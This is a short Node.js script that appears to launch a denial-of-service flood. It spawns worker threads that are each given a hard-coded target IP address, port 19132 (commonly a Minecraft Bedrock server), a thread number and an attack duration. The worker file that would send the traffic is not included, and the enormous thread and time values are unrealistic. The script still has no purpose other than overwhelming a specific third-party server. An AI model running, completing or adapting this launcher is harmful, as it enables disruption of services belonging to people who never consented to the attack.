const { Worker } = require('worker_threads');

const address = '191.238.12.17';
const port = 19132;
const threads = 1000000000000000000000000000n;
const time = 1000000000000000000000000000n;

for (let i = 0n; i < threads; i++) {
  console.log(`[INFO] Starting thread #${i}...`);

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time: time.toString(),
    thread: i.toString()
  });
}

console.log("[INFO] Starting in 3 seconds...");
